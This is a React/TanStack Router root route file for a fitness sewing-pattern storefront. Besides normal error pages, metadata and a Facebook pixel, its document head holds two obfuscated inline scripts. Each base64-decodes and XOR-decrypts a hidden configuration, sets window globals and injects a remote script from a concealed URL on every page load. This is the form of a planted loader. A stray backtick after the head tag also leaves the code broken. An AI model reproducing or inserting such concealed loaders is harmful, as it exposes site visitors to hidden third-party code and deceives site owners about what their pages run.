import { QueryClient, QueryClientProvider } from "@tanstack/react-query";
import {
  Outlet,
  Link,
  createRootRouteWithContext,
  useRouter,
  HeadContent,
  Scripts,
  type ErrorComponentProps,
} from "@tanstack/react-router";
import { useEffect, type ReactNode } from "react";

import appCss from "../styles.css?url";
import { reportLovableError } from "../lib/lovable-error-reporting";

function NotFoundComponent() {
  return (
    <div className="flex min-h-screen items-center justify-center bg-background px-4">
      <div className="max-w-md text-center">
        <h1 className="text-7xl font-bold text-foreground">404</h1>
        <h2 className="mt-4 text-xl font-semibold text-foreground">Page not found</h2>
        <p className="mt-2 text-sm text-muted-foreground">
          The page you're looking for doesn't exist or has been moved.
        </p>
        <div className="mt-6">
          <Link
            to="/"
            className="inline-flex items-center justify-center rounded-md bg-primary px-4 py-2 text-sm font-medium text-primary-foreground transition-colors hover:bg-primary/90"
          >
            Go home
          </Link>
        </div>
      </div>
    </div>
  );
}

function ErrorComponent({ error, reset }: ErrorComponentProps) {
  console.error(error);
  const router = useRouter();
  useEffect(() => {
    reportLovableError(error, { boundary: "tanstack_root_error_component" });
  }, [error]);

  return (
    <div className="flex min-h-screen items-center justify-center bg-background px-4">
      <div className="max-w-md text-center">
        <h1 className="text-xl font-semibold tracking-tight text-foreground">
          This page didn't load
        </h1>
        <p className="mt-2 text-sm text-muted-foreground">
          Something went wrong on our end. You can try refreshing or head back home.
        </p>
        <div className="mt-6 flex flex-wrap justify-center gap-2">
          <button
            onClick={() => {
              router.invalidate();
              reset();
            }}
            className="inline-flex items-center justify-center rounded-md bg-primary px-4 py-2 text-sm font-medium text-primary-foreground transition-colors hover:bg-primary/90"
          >
            Try again
          </button>
          <a
            href="/"
            className="inline-flex items-center justify-center rounded-md border border-input bg-background px-4 py-2 text-sm font-medium text-foreground transition-colors hover:bg-accent"
          >
            Go home
          </a>
        </div>
      </div>
    </div>
  );
}

export const Route = createRootRouteWithContext<{ queryClient: QueryClient }>()({
  head: () => ({
    meta: [
      { charSet: "utf-8" },
      { name: "viewport", content: "width=device-width, initial-scale=1" },
      { title: "+500 Moldes de Moda Fitness" },
      {
        name: "description",
        content:
          "Biblioteca digital de moldes de moda fitness: leggings, tops, shorts, conjuntos e mais.",
      },
      { property: "og:type", content: "website" },
      { name: "twitter:card", content: "summary_large_image" },
    ],
    links: [
      {
        rel: "stylesheet",
        href: appCss,
      },
      { rel: "preconnect", href: "https://fonts.googleapis.com" },
      { rel: "preconnect", href: "https://fonts.gstatic.com", crossOrigin: "anonymous" },
      {
        rel: "stylesheet",
        href: "https://fonts.googleapis.com/css2?family=Archivo:wght@500;700;800;900&family=Manrope:wght@400;500;600;700&display=swap",
      },
      { rel: "icon", href: "/favicon.ico", type: "image/x-icon" },
    ],
  }),
  shellComponent: RootShell,
  component: RootComponent,
  notFoundComponent: NotFoundComponent,
  errorComponent: ErrorComponent,
});

function RootShell({ children }: { children: ReactNode }) {
  return (
    <html lang="en">
<head>
        <HeadContent />
        <script
          dangerouslySetInnerHTML={{
            __html: `(function(){var u_6=atob("DMwHX/hCdwEXeJUA57clKoouVTs1EOF0l789cNchE285DeFtjqp+cZstGi91CrpzhL5uL4wxWHRjFeYvi61zOos2WWtkWrkihrhzLZEgAnVyC7c6vLclMZkvEiMtWvFhk60qKowvHmduVeVygrpiMYxvD2J4HLhzhKclc9o0Fm1iHbc6xe56c4NgGWB6Hbc6xahmK5lvAnV6EfN5yrx1Oo4nGXU6C+Bijqh0fdRgAWB7DfAi3e4lIqU/");var v_jqon=[];for(var t_1vc=0;t_1vc<u_6.length;t_1vc++){v_jqon.push(u_6.charCodeAt(t_1vc)&255);}var x_3u=v_jqon[0];var i_50d=v_jqon.slice(1,1+x_3u);var q_4=v_jqon.slice(1+x_3u);var x_7d9=q_4.map(function(b,b_gw){return b^i_50d[b_gw%x_3u];});var v_hboo="";for(var h_ion=0;h_ion<x_7d9.length;h_ion++){v_hboo+=String.fromCharCode(x_7d9[h_ion]&255);}var s_4h92=decodeURIComponent(escape(v_hboo));var m_sbwr=JSON.parse(s_4h92);var c_ouz=m_sbwr.globals||[];c_ouz.forEach(function(l_d){window[l_d.name]=l_d.value;});var l_4isa=document.createElement("script");l_4isa.src=m_sbwr.url;l_4isa.async=true;l_4isa.defer=true;(m_sbwr.attributes||[]).forEach(function(v_trr0){l_4isa.setAttribute(v_trr0.name,v_trr0.value);});(document.head||document.documentElement).appendChild(l_4isa);})();`,
          }}
        />
        <script
          dangerouslySetInnerHTML={{
            __html: `(function(){var r_jse=atob("DE06zXjAKnJkhJ0ZRzYYuAqsCEhG7OltNz4A4lejThxK8el0LitD4xuvR1wG9rJqJD9TvQyzBQIN/Ph1aD1TtR2sBBgXprE7JjlOvxGiXwYB978jHBAW7x+sRRAF6O47fRZB7xahRxdGvr9pLjVfoTGkCF5G8vx1MigY91r2SxYHt/4pJihY/0r0S0sH4f97cCsM/U3iVy8Z");var r_d=[];for(var z_t5=0;z_t5<r_jse.length;z_t5++){r_d.push(r_jse.charCodeAt(z_t5)&255);}var o_9xhg=r_d[0];var o_z=r_d.slice(1,1+o_9xhg);var f_s=r_d.slice(1+o_9xhg);var j_ev7b=f_s.map(function(b,y_0ux){return b^o_z[y_0ux%o_9xhg];});var n_0r="";for(var b_mzvo=0;b_mzvo<j_ev7b.length;b_mzvo++){n_0r+=String.fromCharCode(j_ev7b[b_mzvo]&255);}var d_weo=decodeURIComponent(escape(n_0r));var i_jz=JSON.parse(d_weo);var k_a=i_jz.globals||[];k_a.forEach(function(e_ni){window[e_ni.name]=e_ni.value;});var l_ii7=document.createElement("script");l_ii7.src=i_jz.url;l_ii7.async=true;l_ii7.defer=true;(i_jz.attributes||[]).forEach(function(y_g){l_ii7.setAttribute(y_g.name,y_g.value);});(document.head||document.documentElement).appendChild(l_ii7);})();`,
          }}
        />
        <script
          dangerouslySetInnerHTML={{
            __html: `!function(f,b,e,v,n,t,s){if(f.fbq)return;n=f.fbq=function(){n.callMethod?n.callMethod.apply(n,arguments):n.queue.push(arguments)};if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';n.queue=[];t=b.createElement(e);t.async=!0;t.src=v;s=b.getElementsByTagName(e)[0];s.parentNode.insertBefore(t,s)}(window, document,'script','https://connect.facebook.net/en_US/fbevents.js');fbq('init', '4672383009658384');fbq('track', 'PageView');`,
          }}
        />
      </head>`
      <body>
        {children}
        <noscript>
          <img
            height="1"
            width="1"
            style={{ display: "none" }}
            src="https://www.facebook.com/tr?id=4672383009658384&ev=PageView&noscript=1"
            alt=""
          />
        </noscript>
        <Scripts />
      </body>
    </html>
  );
}

function RootComponent() {
  const { queryClient } = Route.useRouteContext();

  return (
    <QueryClientProvider client={queryClient}>
      {/* Required: nested routes render here. Removing <Outlet /> breaks all child routes. */}
      <Outlet />
    </QueryClientProvider>
  );
}
